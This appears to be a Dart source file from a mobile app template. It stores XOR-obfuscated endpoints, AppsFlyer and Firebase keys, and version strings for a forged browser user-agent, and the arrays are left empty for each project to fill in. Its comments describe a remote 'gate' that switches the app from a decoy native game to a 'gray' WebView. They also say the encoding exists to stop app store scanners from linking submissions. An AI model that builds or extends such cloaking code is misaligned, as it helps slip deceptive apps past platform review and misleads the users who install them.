import '../crypt/obfuscator.dart';

// ============================================================
// SECURE STRINGS — encoded endpoints & credentials
// ============================================================
// Every value below is a keystream-encoded byte list produced by
// `dart run tool/secret_packer.dart`. Plaintext must NEVER appear
// as a string literal in this file — that would defeat the whole
// point of the obfuscator.
//
// ⚠️ TEMPLATE STATE
// -----------------
// On a fresh template all six arrays are empty on purpose. Empty
// input → obfuscator returns "" → the gate call fails → the app
// falls back to the native game. This is intentional so the
// template compiles and runs without any manager credentials.
//
// ─────────────────────────────────────────────────────────────
// HOW TO POPULATE (per-project first-time setup)
// ─────────────────────────────────────────────────────────────
// 1. Ask the manager for:
//      • config endpoint URL   (e.g. https://example.com/config.php)
//      • AppsFlyer Dev Key
//      • Firebase project number (from google-services.json)
//    See android_gray_guide.md §"Config Request Contract" §1 for the
//    endpoint request procedure (bundleId + Apple ID + app name).
// 2. Open `tool/secret_packer.dart` and paste those raw strings into
//    the plaintext table at the top of that file. Never commit that
//    plaintext version — it's a working file, not a shipped artefact.
// 3. IMPORTANT: also update the codec seed in `lib/crypt/obfuscator.dart`
//    to a NEW value unique to this project. See [FINGERPRINT] block in
//    that file for the naming rule.
// 4. Run:  dart run tool/secret_packer.dart
//    It will print six updated `const List<int>` arrays.
// 5. Paste them here, replacing the six empty arrays below.
// 6. Verify: run the app once — the loading screen must reach the
//    gate reply successfully (either allow → WebView, or deny →
//    native game). If you see the offline screen on a live network,
//    the byte arrays are misaligned with the seed.
//
// ─────────────────────────────────────────────────────────────
// WHY THIS EXISTS
// ─────────────────────────────────────────────────────────────
// Store scanners grep binaries for known affiliate domains, known
// AppsFlyer dev keys, and known Firebase project ids. If any of
// those appear as plaintext, the app is instantly linked to every
// other submission using the same values. XOR-encoding with a
// per-project keystream defeats simple string matching.
// ============================================================

/// Full POST endpoint that decides web (gray) vs native (game).
/// [TODO] Populate from tool/secret_packer.dart.
const List<int> _configEndpoint = <int>[];

/// GCD base URL for the organic-retry attribution refresh.
/// [TODO] Populate from tool/secret_packer.dart.
const List<int> _gcdBase = <int>[];

/// Chrome major version fragment for the forged user-agent.
/// [TODO] Populate from tool/secret_packer.dart. Bump to a current
/// Chrome version on every project — a stale UA is a scan signal.
const List<int> _chromeVersion = <int>[];

/// WebKit version fragment for the forged user-agent.
/// [TODO] Populate from tool/secret_packer.dart.
const List<int> _webkitVersion = <int>[];

/// AppsFlyer Dev Key.
/// [TODO] Populate from tool/secret_packer.dart.
const List<int> _attributionKey = <int>[];

/// Firebase project number / sender id.
/// [TODO] Populate from tool/secret_packer.dart.
const List<int> _messagingProject = <int>[];

/// Full POST endpoint that decides web (gray) vs native (game).
String unlockConfigEndpoint() => rev(_configEndpoint);

/// AppsFlyer Dev Key (empty until provided).
String unlockAttributionKey() => rev(_attributionKey);

/// Firebase project number / sender id (empty until provided).
String unlockMessagingProject() => rev(_messagingProject);

/// Chrome major version fragment for the forged user-agent.
String unlockChromeVersion() => rev(_chromeVersion);

/// WebKit version fragment for the forged user-agent.
String unlockWebkitVersion() => rev(_webkitVersion);

/// Builds the GCD (Get Conversion Data) retry URL for the given identifiers.
/// Returns an empty string if the base URL is not yet encoded — callers
/// must treat "" as "GCD retry unavailable, use whatever attribution the
/// SDK already delivered".
String unlockGcdUrl(String appId, String deviceId) {
  final String base = rev(_gcdBase);
  if (base.isEmpty) return '';
  return '$base$appId?devkey=${unlockAttributionKey()}&device_id=$deviceId';
}
